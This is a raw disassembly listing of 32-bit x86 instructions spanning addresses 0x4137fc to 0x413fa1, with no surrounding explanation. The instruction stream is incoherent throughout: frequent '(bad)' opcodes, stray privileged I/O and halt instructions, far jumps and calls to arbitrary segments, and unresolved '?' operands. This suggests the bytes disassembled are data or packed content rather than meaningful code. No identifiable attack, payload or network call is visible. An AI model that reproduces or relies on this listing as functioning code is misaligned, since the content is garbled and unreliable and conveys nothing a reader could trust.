  4137fc:	lods   eax,DWORD PTR ds:[esi]
  4137fd:	ss into 
  4137ff:	push   ebx
  413800:	(bad)  
  413801:	mov    ch,0x83
  413803:	inc    ebx
  413804:	mov    dl,0x2f
  413806:	cmp    edx,DWORD PTR [ebx]
  413808:	jmp    DWORD PTR [eax-0x4c]
  41380b:	pop    es
  41380c:	pusha  
  41380d:	aaa    
  41380e:	in     al,0xb4
  413810:	out    0x7c,eax
  413812:	call   0x80f7c372
  413817:	es out dx,eax
  413819:	stos   DWORD PTR es:[edi],eax
  41381a:	or     eax,0x43f17d23
  41381f:	xor    cl,0xea
  413822:	icebp  
  413823:	or     dh,ch
  413825:	cmc    
  413826:	cmp    DWORD PTR [edi+0x5240d89a],eax
  41382c:	add    BYTE PTR [edx+0x19],0x94
  413830:	in     al,0x6e
  413832:	sub    BYTE PTR [edx+ebx*1+0x46],ch
  413836:	dec    ecx
  413837:	and    esi,esp
  413839:	lods   eax,DWORD PTR ds:[esi]
  41383a:	push   edx
  41383b:	mov    cl,cl
  41383d:	mov    BYTE PTR [ebx],ah
  41383f:	into   
  413840:	mov    ds:0x3248f38e,al
  413845:	adc    DWORD PTR ds:0xcb89c2e0,esp
  41384b:	hlt    
  41384c:	ins    DWORD PTR es:[edi],dx
  41384d:	cmp    al,0x92
  41384f:	retf   0xc3ec
  413852:	(bad)  
  413853:	mul    DWORD PTR [esi+0x149f3321]
  413859:	sbb    al,0x2f
  41385b:	(bad)  [esi-0x24]
  41385e:	sub    al,0x20
  413860:	add    eax,0x49
  413863:	mov    al,0x1
  413865:	int3   
  413866:	lods   al,BYTE PTR ds:[esi]
  413867:	aad    0xd3
  413869:	jmp    0xe0f9:0x197c2f4f
  413870:	pop    eax
  413871:	fs mov ebp,0xc5841db0
  413877:	imul   esp,DWORD PTR [edi],0x21
  41387a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41387b:	adc    esi,DWORD PTR [edi-0x58675d6e]
  413881:	mov    WORD PTR [edx],?
  413883:	(bad)  
  413884:	sti    
  413885:	xor    BYTE PTR [ebx-0x70],0xb1
  413889:	lahf   
  41388a:	and    ch,BYTE PTR [edi+0x39e387a0]
  413890:	mov    dl,al
  413892:	popf   
  413893:	sub    al,0x6a
  413895:	push   esp
  413896:	pop    ds
  413897:	jne    0x413862
  413899:	mov    eax,DWORD PTR [ecx+0x7]
  41389c:	cli    
  41389d:	mov    ds:0xd8d5317f,al
  4138a2:	std    
  4138a3:	or     eax,0x1cd3e440
  4138a8:	jge    0x413839
  4138aa:	(bad)  
  4138ab:	ror    DWORD PTR [edx-0x34597caa],cl
  4138b1:	add    BYTE PTR [ecx+0x21e79836],ch
  4138b7:	sbb    ah,bl
  4138b9:	pop    ss
  4138ba:	es mov ebx,0x26cfca54
  4138c0:	inc    ebx
  4138c1:	xchg   BYTE PTR [esi+0x36],bl
  4138c4:	xor    edi,ecx
  4138c6:	ss mov dl,0x50
  4138c9:	jne    0x41390c
  4138cb:	and    al,0x23
  4138cd:	jnp    0x413933
  4138cf:	retf   0x5e66
  4138d2:	fbstp  TBYTE PTR [eax-0x1c]
  4138d5:	adc    eax,0x41b9f187
  4138da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138db:	lock loope 0x4138d4
  4138de:	or     al,0x1a
  4138e0:	jne    0x413925
  4138e2:	mov    edi,?
  4138e4:	cs pop es
  4138e6:	pop    ss
  4138e7:	std    
  4138e8:	pop    ss
  4138e9:	mov    ds:0x3740b179,al
  4138ee:	xor    bl,BYTE PTR [esi+0x70871c6a]
  4138f4:	nop
  4138f5:	ins    BYTE PTR es:[edi],dx
  4138f6:	xchg   DWORD PTR [edx],esp
  4138f8:	aaa    
  4138f9:	jnp    0x4138b9
  4138fb:	sbb    ebx,DWORD PTR [ecx+0x3b]
  4138fe:	cmp    al,0xd2
  413900:	inc    edi
  413901:	popa   
  413902:	arpl   WORD PTR [eax],bx
  413904:	(bad)  
  413905:	jmp    0x2b43:0x1ff54dba
  41390c:	cmp    esi,ecx
  41390e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41390f:	dec    ecx
  413910:	nop
  413911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413912:	or     BYTE PTR ds:0x570c5d,dl
  413918:	shl    BYTE PTR [edx],0xcf
  41391b:	gs and eax,0x69a6d60a
  413921:	pushf  
  413922:	xchg   esp,eax
  413923:	enter  0xa69d,0x94
  413927:	aaa    
  413928:	int3   
  413929:	iret   
  41392a:	push   esi
  41392b:	jg     0x413932
  41392d:	add    al,0x98
  41392f:	dec    ebp
  413930:	jg     0x4138f0
  413932:	push   cs
  413933:	add    eax,0x1c148a2b
  413938:	jae    0x4138c2
  41393a:	addr16 push ds
  41393c:	pushf  
  41393d:	or     esp,esp
  41393f:	fsubr  QWORD PTR [ebp-0x535d2f69]
  413945:	adc    BYTE PTR [eax],0xe5
  413948:	pusha  
  413949:	sbb    bh,ah
  41394b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41394c:	out    dx,eax
  41394d:	push   esp
  41394e:	pop    esp
  41394f:	clc    
  413950:	xchg   BYTE PTR [edx],dh
  413952:	mov    eax,ds:0x4977d28
  413957:	mov    dh,BYTE PTR [edx-0x1f]
  41395a:	xor    dh,BYTE PTR [ecx+0x6e]
  41395d:	add    esp,DWORD PTR [edx-0x2a1352c9]
  413963:	sbb    DWORD PTR [ecx-0x58],0xffffffb6
  413967:	loop   0x413957
  413969:	and    DWORD PTR [esi],ebp
  41396b:	dec    esp
  41396c:	adc    cl,dl
  41396e:	adc    eax,0x86fb3ab3
  413973:	xor    ch,dh
  413975:	mov    gs,WORD PTR ds:0x20a15621
  41397b:	mov    ds:0xbf86c754,eax
  413980:	out    0x1,al
  413982:	(bad)
  413985:	jmp    0x52b0:0x93362256
  41398c:	sub    ch,BYTE PTR [edx-0x1c]
  41398f:	cli    
  413990:	dec    ecx
  413991:	lods   al,BYTE PTR ds:[esi]
  413992:	or     al,0xa2
  413994:	cmp    BYTE PTR [eax-0x4e1f688b],bl
  41399a:	or     ebx,esp
  41399c:	add    al,0x1
  41399e:	xor    BYTE PTR [eax-0x697837e0],al
  4139a4:	xlat   BYTE PTR ds:[ebx]
  4139a6:	pop    esp
  4139a7:	dec    edi
  4139a8:	mov    dl,0xdc
  4139aa:	and    eax,esp
  4139ac:	and    esi,edi
  4139ae:	push   edi
  4139af:	pop    ss
  4139b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b1:	push   edi
  4139b2:	sbb    dh,bh
  4139b4:	fadd   st(6),st
  4139b6:	push   ebx
  4139b7:	adc    al,0x64
  4139b9:	js     0x41399b
  4139bb:	inc    ebp
  4139bc:	or     al,0x93
  4139be:	(bad)  
  4139bf:	jle    0x413974
  4139c1:	sti    
  4139c2:	pop    edi
  4139c3:	push   edi
  4139c4:	dec    eax
  4139c5:	retf   
  4139c6:	test   DWORD PTR [edx+0x28],ebp
  4139c9:	sar    DWORD PTR [edx],0xba
  4139cc:	pop    ebx
  4139cd:	mov    dh,0xb3
  4139cf:	mov    al,0x75
  4139d1:	sbb    al,0x53
  4139d3:	test   BYTE PTR [esi+0x6d],bl
  4139d6:	push   ecx
  4139d7:	out    dx,eax
  4139d8:	fldcw  WORD PTR [ebx-0x2f]
  4139db:	xchg   ebx,eax
  4139dc:	dec    edx
  4139dd:	jmp    0xca6dd19c
  4139e2:	dec    esp
  4139e3:	fsubr  st(2),st
  4139e5:	or     ax,0x1ab1
  4139e9:	adc    DWORD PTR [ebx+eax*8-0x70],0x5b2d54d0
  4139f1:	clc    
  4139f2:	and    esp,0xffffffc1
  4139f5:	sbb    esi,edx
  4139f7:	pop    ebx
  4139f8:	scas   eax,DWORD PTR es:[edi]
  4139f9:	inc    ebx
  4139fa:	das    
  4139fb:	xor    al,0x91
  4139fd:	and    BYTE PTR [ebx+0x1da841a2],bh
  413a03:	push   esp
  413a04:	mov    ds:0xb7b89eae,al
  413a09:	xor    eax,0xe49990bf
  413a0e:	pusha  
  413a0f:	sub    BYTE PTR [esi],bh
  413a11:	push   edx
  413a12:	(bad)  
  413a13:	inc    edi
  413a14:	jge    0x413a45
  413a16:	fs repz jecxz 0x4139f5
  413a1a:	ins    DWORD PTR es:[edi],dx
  413a1b:	mov    eax,0x955c115f
  413a20:	push   esi
  413a21:	xor    BYTE PTR [ecx+ecx*2],bh
  413a24:	jae    0x4139c2
  413a26:	sti    
  413a27:	(bad)  
  413a29:	xchg   esp,eax
  413a2a:	jp     0x4139c3
  413a2c:	sbb    DWORD PTR [ebx-0x44a0d03d],edi
  413a32:	push   0x589a49e9
  413a37:	stc    
  413a38:	outs   dx,BYTE PTR ds:[esi]
  413a39:	mov    cl,0xa1
  413a3b:	lock jle 0x413a2b
  413a3e:	sbb    ebp,DWORD PTR [eax+0x34]
  413a41:	test   al,0xbf
  413a43:	jne    0x413ab2
  413a45:	shl    DWORD PTR [ebx],cl
  413a47:	jbe    0x413aaf
  413a49:	(bad)  
  413a4a:	or     ebp,esp
  413a4c:	cmp    ebx,DWORD PTR [edx]
  413a4e:	mov    ah,BYTE PTR ds:0xbf2667d8
  413a54:	sub    edi,0x5f
  413a57:	dec    eax
  413a58:	mov    edx,0xe137e73b
  413a5d:	inc    eax
  413a5e:	call   0x43e6:0x74fc4b72
  413a65:	hlt    
  413a66:	cs pushf 
  413a68:	aad    0x5b
  413a6a:	addr16 and eax,eax
  413a6d:	fwait
  413a6e:	adc    BYTE PTR ds:0x45732cc6,ch
  413a74:	arpl   WORD PTR [edx+0x66195e6a],di
  413a7a:	dec    ebx
  413a7b:	ins    BYTE PTR es:[edi],dx
  413a7c:	mov    al,0xef
  413a7e:	push   es
  413a7f:	mov    ?,WORD PTR [esi+ebp*1+0x1c]
  413a83:	jle    0x413a23
  413a85:	icebp  
  413a86:	adc    BYTE PTR [ecx],0x92
  413a89:	aam    0x89
  413a8b:	dec    ebp
  413a8c:	dec    ecx
  413a8d:	add    ch,BYTE PTR [esi]
  413a8f:	rcl    ebx,cl
  413a91:	pop    es
  413a92:	sahf   
  413a93:	daa    
  413a94:	and    cl,ch
  413a96:	mov    cl,0xa7
  413a98:	xor    eax,0x6011bcd9
  413a9d:	mov    dl,BYTE PTR [ebp+0x77]
  413aa0:	(bad)  [edi]
  413aa2:	dec    ebp
  413aa3:	out    0xff,eax
  413aa5:	lods   eax,DWORD PTR ds:[esi]
  413aa6:	and    eax,0x3729646b
  413aab:	ret    0xdf05
  413aae:	add    esp,edi
  413ab0:	mov    bl,0x52
  413ab2:	(bad)  
  413ab4:	pop    ss
  413ab5:	dec    ebx
  413ab6:	xchg   DWORD PTR [edx+0x2534f2a7],esp
  413abc:	jp     0x413ae8
  413abe:	addr16 push ecx
  413ac0:	jno    0x413ab4
  413ac2:	jecxz  0x413a69
  413ac4:	icebp  
  413ac5:	sub    dl,0x4d
  413ac8:	push   esi
  413ac9:	mov    bh,0xe9
  413acb:	mov    bl,0xf0
  413acd:	inc    ecx
  413ace:	nop
  413acf:	jle    0x413a85
  413ad1:	bound  ebp,QWORD PTR [ecx+0x3de905fa]
  413ad7:	pop    edi
  413ad8:	std    
  413ad9:	in     al,0xb9
  413adb:	dec    ecx
  413adc:	xor    esi,DWORD PTR [ecx]
  413ade:	xchg   esp,eax
  413adf:	dec    ecx
  413ae0:	dec    esi
  413ae1:	out    0x16,al
  413ae3:	pop    ebx
  413ae4:	jnp    0x413aea
  413ae6:	out    dx,al
  413ae7:	push   ebp
  413ae8:	inc    edi
  413ae9:	sahf   
  413aea:	out    dx,eax
  413aeb:	mov    esi,0xc8822b60
  413af0:	rol    DWORD PTR [edi-0x35],1
  413af3:	jbe    0x413b72
  413af5:	mov    dl,0xc7
  413af7:	jo     0x413b10
  413af9:	push   ss
  413afa:	js     0x413ab9
  413afc:	les    ecx,FWORD PTR [ebx-0x1e656a7d]
  413b02:	mov    al,ds:0xeb53d35f
  413b07:	adc    eax,0x7daa5686
  413b0c:	das    
  413b0d:	mov    bl,0xdf
  413b0f:	loopne 0x413af0
  413b11:	jnp    0x413ac1
  413b13:	mov    ds:0xa1b14890,eax
  413b18:	(bad)  
  413b19:	jnp    0x413acc
  413b1b:	jecxz  0x413aed
  413b1d:	add    BYTE PTR [eax-0x567e88b4],bh
  413b23:	leave  
  413b24:	in     al,dx
  413b25:	es pop eax
  413b27:	xchg   esp,eax
  413b28:	dec    ebp
  413b29:	xchg   ebp,eax
  413b2a:	mov    edi,0x8409feb2
  413b2f:	mov    al,ds:0x19ac7372
  413b34:	sub    al,0x73
  413b36:	frstor fs:[edi+0x11]
  413b3a:	fstp   DWORD PTR [edx+esi*2+0x40]
  413b3e:	arpl   dx,bp
  413b40:	mov    bl,0x3b
  413b42:	jmp    0x413af7
  413b44:	das    
  413b45:	dec    ebp
  413b46:	push   ss
  413b47:	int    0x4b
  413b49:	push   edi
  413b4a:	ins    BYTE PTR es:[edi],dx
  413b4b:	cmp    ebp,0x8
  413b4e:	stos   BYTE PTR es:[edi],al
  413b4f:	sub    dl,BYTE PTR [ecx-0x1b590b6d]
  413b55:	pop    eax
  413b56:	add    BYTE PTR [ebp+0x2820db6e],bh
  413b5c:	inc    ecx
  413b5d:	iret   
  413b5e:	adc    DWORD PTR ds:0x5b2509f7,esi
  413b64:	mov    bl,0x3d
  413b66:	dec    edx
  413b67:	fsubp  st(5),st
  413b69:	push   edi
  413b6a:	scas   eax,DWORD PTR es:[edi]
  413b6b:	psllw  mm5,QWORD PTR [eax-0x412a001a]
  413b72:	inc    esi
  413b73:	loope  0x413b03
  413b75:	lahf   
  413b76:	dec    esp
  413b77:	enter  0x793,0xa2
  413b7b:	adc    BYTE PTR [ebx],al
  413b7d:	(bad)
  413b80:	mov    eax,0x807b77e2
  413b85:	leave  
  413b86:	jp     0x413b48
  413b88:	push   0x4eca03b6
  413b8d:	mov    ah,0xb0
  413b8f:	repnz retf 0x4a43
  413b93:	loopne 0x413b6b
  413b95:	into   
  413b96:	xchg   BYTE PTR [esi-0x37fa1944],al
  413b9c:	(bad)  
  413b9d:	ins    BYTE PTR es:[edi],dx
  413b9e:	nop
  413b9f:	es jmp 0x20926bda
  413ba5:	and    al,0xb0
  413ba7:	pop    es
  413ba8:	push   ecx
  413ba9:	jae    0x413c1d
  413bab:	(bad)  
  413bac:	repnz sub DWORD PTR [ebx-0x2c],ebp
  413bb0:	in     al,dx
  413bb1:	xchg   esp,eax
  413bb2:	cmp    al,0x27
  413bb4:	shr    BYTE PTR [ebx-0x25aa7016],cl
  413bba:	pop    ebp
  413bbb:	xchg   esi,eax
  413bbc:	mov    bl,0xb3
  413bbe:	mov    eax,0xc5c63c64
  413bc3:	test   DWORD PTR [ecx+0x42b5645e],esi
  413bc9:	dec    ecx
  413bca:	in     al,dx
  413bcb:	out    0x41,eax
  413bcd:	sub    dl,BYTE PTR [ecx-0x4d]
  413bd0:	(bad)  
  413bd1:	outs   dx,BYTE PTR ds:[esi]
  413bd2:	outs   dx,BYTE PTR ds:[esi]
  413bd3:	iret   
  413bd4:	mov    bl,dh
  413bd6:	or     DWORD PTR [esi+0x2b6592a5],edi
  413bdc:	adc    cl,BYTE PTR [eax+0x4efa4d65]
  413be2:	(bad)  
  413be3:	mov    eax,ds:0x96c73e11
  413be8:	outs   dx,DWORD PTR ds:[esi]
  413be9:	mov    ds:0x9265f6,eax
  413bee:	mov    ebp,0xf154d78b
  413bf3:	push   ds
  413bf4:	jle    0x413b9a
  413bf6:	loopne 0x413c60
  413bf8:	mov    eax,0x2c2417c8
  413bfd:	mov    al,ds:0x653b3758
  413c02:	jmp    0x413c51
  413c04:	in     eax,0x5a
  413c06:	sub    ecx,edi
  413c08:	adc    esp,0xfffffff2
  413c0b:	mov    DWORD PTR cs:[esi],edi
  413c0e:	aad    0x7e
  413c10:	adc    al,0x4e
  413c12:	jp     0x413c11
  413c14:	and    eax,0x81811e9b
  413c19:	das    
  413c1a:	or     eax,0x31f4da36
  413c1f:	loope  0x413c41
  413c21:	(bad)  
  413c22:	pusha  
  413c23:	sub    ebp,DWORD PTR [edx-0x6f]
  413c26:	jle    0x413c33
  413c28:	add    DWORD PTR gs:[esi-0x46d0a0c2],eax
  413c2f:	ins    BYTE PTR es:[edi],dx
  413c30:	sub    ebx,DWORD PTR [ebp-0x50dc612f]
  413c36:	jns    0x413bf3
  413c38:	sbb    cl,BYTE PTR [edi-0x4a0486ba]
  413c3e:	nop
  413c3f:	adc    DWORD PTR [edx],esi
  413c41:	xor    BYTE PTR [ebp+0x0],dh
  413c44:	les    edx,FWORD PTR [edi+0x35]
  413c47:	push   esp
  413c48:	popf   
  413c49:	hlt    
  413c4a:	(bad)  
  413c4b:	push   esp
  413c4c:	jbe    0x413bf4
  413c4e:	pop    edi
  413c4f:	stc    
  413c50:	pop    edi
  413c51:	pop    edx
  413c52:	std    
  413c53:	aad    0x2e
  413c55:	mov    BYTE PTR [ecx],al
  413c57:	mov    dh,ah
  413c59:	cmp    DWORD PTR ds:0x587c9c31,ebx
  413c5f:	push   edi
  413c60:	cmp    BYTE PTR [ebx+esi*2],dh
  413c63:	mov    bl,0x69
  413c65:	call   0xbe039cd6
  413c6a:	xchg   BYTE PTR [esi-0x4e],dl
  413c6d:	jmp    0x413c0a
  413c6f:	and    ah,0xfd
  413c72:	aaa    
  413c73:	xor    BYTE PTR [eax],dl
  413c75:	pop    esp
  413c76:	js     0x413cbe
  413c78:	test   al,0x13
  413c7a:	aad    0xcc
  413c7c:	jne    0x413cd9
  413c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c7f:	jmp    0xe21e:0x975f5f84
  413c86:	add    ebx,DWORD PTR [esi+edi*8+0x1882237e]
  413c8d:	repz imul ecx,ebx,0xa0cc4436
  413c94:	inc    ebx
  413c95:	cmp    al,0xe4
  413c97:	test   BYTE PTR [ecx-0x40367cf3],cl
  413c9d:	xchg   edx,eax
  413c9e:	pop    edi
  413c9f:	shr    DWORD PTR ds:0x6b397948,cl
  413ca5:	mov    ah,0xa0
  413ca7:	cmc    
  413ca8:	mov    al,ds:0xe4942ae3
  413cad:	in     al,dx
  413cae:	add    BYTE PTR [ebx-0xf],dh
  413cb1:	into   
  413cb2:	es jne 0x413c57
  413cb5:	pop    ds
  413cb6:	xchg   ebp,eax
  413cb7:	mov    cs,ebp
  413cb9:	lods   al,BYTE PTR ds:[esi]
  413cba:	push   ebp
  413cbb:	js     0x413ce7
  413cbd:	dec    esp
  413cbe:	lea    edx,[eax+0x48f0f671]
  413cc4:	loope  0x413ce6
  413cc6:	xchg   DWORD PTR [esi+0x47],esp
  413cc9:	(bad)  
  413cca:	mov    ebx,0xdefb7542
  413ccf:	adc    DWORD PTR [ebx+0x6ec731f6],ecx
  413cd5:	adc    ecx,DWORD PTR [ebx+0x34]
  413cd8:	sub    ebx,eax
  413cda:	and    BYTE PTR [edi+0x4f],dl
  413cdd:	in     al,dx
  413cde:	or     DWORD PTR [esi],edi
  413ce0:	and    eax,0x1e9d6b50
  413ce5:	and    al,0x7c
  413ce7:	loop   0x413ca5
  413ce9:	cmp    al,0x48
  413ceb:	and    ebp,ecx
  413ced:	xor    al,0x11
  413cef:	mov    ebx,0xb0ad001c
  413cf4:	inc    ecx
  413cf5:	scas   al,BYTE PTR es:[edi]
  413cf6:	and    al,0x29
  413cf8:	std    
  413cf9:	shl    DWORD PTR [edx],cl
  413cfb:	inc    ebx
  413cfc:	cld    
  413cfd:	dec    esp
  413cfe:	dec    ecx
  413cff:	xor    ch,ch
  413d01:	test   eax,0x98f2c649
  413d06:	mov    edi,0xe61af143
  413d0b:	add    ecx,DWORD PTR [esi]
  413d0d:	cmp    eax,0x5ffea10
  413d12:	mov    ebp,0xc7af4336
  413d17:	repnz (bad) 
  413d19:	and    eax,0x3e7ffb17
  413d1e:	adc    al,BYTE PTR [esi]
  413d20:	mov    ds:0xf96f16ce,al
  413d25:	mov    BYTE PTR [esi],bl
  413d27:	sub    ah,BYTE PTR [eax]
  413d29:	lods   eax,DWORD PTR ds:[esi]
  413d2a:	jae    0x413cb1
  413d2c:	into   
  413d2d:	push   0x4
  413d2f:	mov    ebx,DWORD PTR [esp+edx*8]
  413d32:	out    dx,eax
  413d33:	es push eax
  413d35:	mov    cl,0x36
  413d37:	mov    ss,WORD PTR [edi+0x3cd6e6e0]
  413d3d:	cmp    dl,ch
  413d3f:	retf   0xdb8c
  413d42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d43:	nop
  413d44:	les    esp,FWORD PTR [ebx]
  413d46:	rcr    BYTE PTR ds:0x26f8d012,cl
  413d4c:	test   eax,0x6f1b7c1
  413d51:	popf   
  413d52:	fnstcw WORD PTR [esi+0x5abbef2f]
  413d58:	lahf   
  413d59:	dec    esi
  413d5a:	mov    al,ds:0x67e354d3
  413d5f:	pop    ebp
  413d60:	sar    ecx,cl
  413d62:	fsubrp st(0),st
  413d64:	mov    ebx,0x86de8e7e
  413d69:	pop    ecx
  413d6a:	push   esp
  413d6b:	sub    DWORD PTR [esi+0x72def354],ecx
  413d71:	cli    
  413d72:	out    0x53,eax
  413d74:	xlat   BYTE PTR ds:[ebx]
  413d75:	loop   0x413d6c
  413d77:	xor    bh,BYTE PTR es:[edi]
  413d7a:	adc    bh,BYTE PTR [esi]
  413d7c:	shl    ecx,1
  413d7e:	add    ebx,DWORD PTR [esi]
  413d80:	daa    
  413d81:	dec    ecx
  413d82:	lea    ebx,[edi+0x43]
  413d85:	and    DWORD PTR [eax],ebp
  413d87:	sbb    al,0xd2
  413d89:	fistp  WORD PTR [ecx-0x25]
  413d8c:	int    0x97
  413d8e:	xor    BYTE PTR [esi],dl
  413d90:	sub    DWORD PTR [edi-0x5e],esi
  413d93:	pop    edx
  413d94:	addr16 mov al,0xfa
  413d97:	scas   al,BYTE PTR es:[edi]
  413d98:	ror    BYTE PTR [esi-0x6cb36de0],0x17
  413d9f:	loopne 0x413d34
  413da1:	pop    edx
  413da2:	xchg   DWORD PTR [edx-0x5a53de1],ebx
  413da8:	cli    
  413da9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413daa:	mov    esi,0x2178e04b
  413daf:	scas   al,BYTE PTR es:[edi]
  413db0:	sub    ch,BYTE PTR [ecx+eax*2+0x513b5094]
  413db7:	xchg   esp,eax
  413db8:	inc    esp
  413db9:	lds    esp,FWORD PTR [edx]
  413dbb:	jecxz  0x413d91
  413dbd:	and    eax,0xfb4cd1c6
  413dc2:	adc    al,BYTE PTR [eax+eiz*4]
  413dc5:	xchg   ecx,eax
  413dc6:	ds push es
  413dc8:	or     DWORD PTR [edx],ecx
  413dca:	enter  0x879a,0x66
  413dce:	xchg   DWORD PTR [esi-0x7b8f15d1],edi
  413dd4:	inc    ebx
  413dd5:	(bad)  
  413dd6:	ret    0x7cc1
  413dd9:	mul    BYTE PTR [eax-0x6f5302c5]
  413ddf:	push   edx
  413de0:	das    
  413de1:	ja     0x413e06
  413de3:	jne    0x413e2d
  413de5:	sub    al,0x7c
  413de7:	call   0xf575:0x68d64dc8
  413dee:	push   esp
  413def:	cs mov dh,0x27
  413df2:	gs aaa 
  413df4:	cmp    DWORD PTR [ecx],0xa9e9d3fd
  413dfa:	into   
  413dfb:	add    eax,0xd2cc8f92
  413e00:	ror    DWORD PTR [esi],0x89
  413e03:	mov    bl,0x2
  413e05:	push   0x7f
  413e07:	add    BYTE PTR [edi],ch
  413e09:	fisttp QWORD PTR [ebx]
  413e0b:	(bad)  
  413e0c:	adc    eax,0x482e9156
  413e11:	xor    eax,0xe805c80c
  413e16:	mov    ah,0xd9
  413e18:	shl    BYTE PTR ds:0xe795c593,0x95
  413e1f:	sbb    eax,0x9559ea93
  413e24:	inc    ecx
  413e25:	mov    al,0xcc
  413e27:	push   ebp
  413e28:	jge    0x413e2f
  413e2a:	test   DWORD PTR [ecx],esi
  413e2c:	sub    al,0x46
  413e2e:	fld    QWORD PTR [ebx]
  413e30:	aam    0xd9
  413e32:	adc    esp,DWORD PTR [ebx-0x75aa3482]
  413e38:	jo     0x413dbb
  413e3a:	dec    esi
  413e3b:	out    dx,eax
  413e3c:	mov    eax,es
  413e3e:	js     0x413ddf
  413e40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e41:	jge    0x413e6b
  413e43:	fild   DWORD PTR [esi-0x6e]
  413e46:	int3   
  413e47:	mov    bh,0x73
  413e49:	sbb    al,0x5b
  413e4b:	dec    esi
  413e4c:	mov    dl,0xf1
  413e4e:	loop   0x413ebd
  413e50:	dec    edi
  413e51:	ret    
  413e52:	inc    esi
  413e53:	push   ecx
  413e54:	jmp    0xba8b:0xb6c2900
  413e5b:	dec    edx
  413e5c:	mov    ds:0x11e6ccfc,eax
  413e61:	shl    BYTE PTR [ebx+0x65],0x58
  413e65:	int3   
  413e66:	mov    edx,edx
  413e68:	cmp    eax,0xa96aa54f
  413e6d:	xchg   BYTE PTR [esi-0x5cbe8e1e],al
  413e73:	push   ecx
  413e74:	ja     0x413e39
  413e76:	int    0x74
  413e78:	cdq    
  413e79:	getsec 
  413e7b:	adc    al,0x69
  413e7d:	shr    BYTE PTR [ebx+ebp*2+0x34b829ad],1
  413e84:	jle    0x413ea9
  413e86:	push   ecx
  413e87:	dec    edx
  413e88:	pop    eax
  413e89:	call   0x6299:0x4e59f99e
  413e90:	(bad)  
  413e91:	cmc    
  413e92:	and    al,0x84
  413e94:	clc    
  413e95:	cwde   
  413e96:	(bad)  
  413e98:	clc    
  413e99:	mov    ebp,DWORD PTR [ebx-0x24]
  413e9c:	leave  
  413e9d:	fadd   QWORD PTR [eax-0x2944cb2b]
  413ea3:	stc    
  413ea4:	shl    bh,0x67
  413ea7:	add    DWORD PTR [esp+edi*1-0x65],ecx
  413eab:	inc    ebx
  413eac:	push   0xffffffd4
  413eae:	adc    eax,0x823f462b
  413eb3:	clc    
  413eb4:	adc    al,0xf0
  413eb6:	push   ebp
  413eb7:	in     eax,dx
  413eb8:	popf   
  413eb9:	pop    edx
  413eba:	add    ebp,esi
  413ebc:	out    dx,al
  413ebd:	sbb    BYTE PTR [eax-0x77],ch
  413ec0:	rcr    DWORD PTR ds:0x4c7fa2fe,0xf2
  413ec7:	add    cl,BYTE PTR [edi]
  413ec9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eca:	js     0x413ebd
  413ecc:	push   edi
  413ecd:	outs   dx,DWORD PTR ds:[esi]
  413ece:	in     al,dx
  413ecf:	and    BYTE PTR [edi-0x139b936e],bl
  413ed5:	push   eax
  413ed6:	(bad)  [esi+0x67]
  413ed9:	int    0xc
  413edb:	stos   BYTE PTR es:[edi],al
  413edc:	iret   
  413edd:	xlat   BYTE PTR ds:[ebx]
  413ede:	mov    ds:0x2116fa60,al
  413ee3:	push   edx
  413ee4:	push   ss
  413ee5:	dec    edx
  413ee6:	adc    edi,0xa94f1ee5
  413eec:	mov    al,0xa8
  413eee:	adc    eax,0xbe2b596d
  413ef3:	xor    al,0x51
  413ef5:	push   esp
  413ef6:	hlt    
  413ef7:	and    eax,0xd294d827
  413efc:	mov    esi,0x6827de33
  413f01:	int3   
  413f02:	je     0x413ecf
  413f04:	rep ins BYTE PTR es:[edi],dx
  413f06:	fisttp WORD PTR [ebx-0x5a496050]
  413f0c:	dec    ecx
  413f0d:	pop    ss
  413f0e:	into   
  413f0f:	and    dh,bl
  413f11:	ins    DWORD PTR es:[edi],dx
  413f12:	or     DWORD PTR [ecx-0x37b51838],edi
  413f18:	adc    DWORD PTR [ecx+ecx*4],eax
  413f1b:	dec    eax
  413f1c:	mov    ds:0x63306e49,eax
  413f21:	or     al,0xa0
  413f23:	int3   
  413f24:	lahf   
  413f25:	mov    dh,0x2c
  413f27:	cld    
  413f28:	jmp    0xa3ac:0xf7b21b57
  413f2f:	inc    edx
  413f30:	cld    
  413f31:	jns    0x413f47
  413f33:	jbe    0x413ec4
  413f35:	xchg   edi,eax
  413f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f37:	sbb    ebp,DWORD PTR [ecx-0xc]
  413f3a:	loopne 0x413f31
  413f3c:	or     ch,BYTE PTR [ebp-0x34]
  413f3f:	ror    DWORD PTR [esi+0x615fe99d],1
  413f45:	inc    eax
  413f46:	lock pop edx
  413f48:	sub    al,BYTE PTR [eax+0x5a]
  413f4b:	adc    cl,BYTE PTR [edx]
  413f4d:	mov    edx,0x9243f3a
  413f52:	mov    edx,0x61aa070
  413f57:	fdiv   st(5),st
  413f59:	(bad)  
  413f5a:	jnp    0x413fb3
  413f5c:	das    
  413f5d:	pop    ebp
  413f5e:	mov    ?,WORD PTR [ebx+edx*1]
  413f61:	int3   
  413f62:	outs   dx,BYTE PTR ds:[esi]
  413f63:	imul   ebp,DWORD PTR [edx],0x24
  413f66:	xchg   BYTE PTR [ebx+0x6a1cc90f],cl
  413f6c:	enter  0x4b50,0xe4
  413f70:	inc    edx
  413f71:	xor    BYTE PTR [ecx+0x4d],ah
  413f74:	fstp   DWORD PTR [eax-0x41dbacb]
  413f7a:	push   ebx
  413f7b:	in     eax,dx
  413f7c:	push   0x548ee91c
  413f81:	repz sbb ebp,esi
  413f84:	xchg   BYTE PTR [eax],bl
  413f86:	das    
  413f87:	sbb    DWORD PTR [esi+0x5f],eax
  413f8a:	cwde   
  413f8b:	dec    esi
  413f8c:	pshufw mm3,mm4,0xa8
  413f90:	sbb    BYTE PTR [edi+esi*4],dl
  413f93:	test   BYTE PTR [eax-0x73b7e017],bl
  413f99:	fwait
  413f9a:	mov    WORD PTR ds:0xa6141687,?
  413fa0:	inc    edi
  413fa1:	out    dx,al
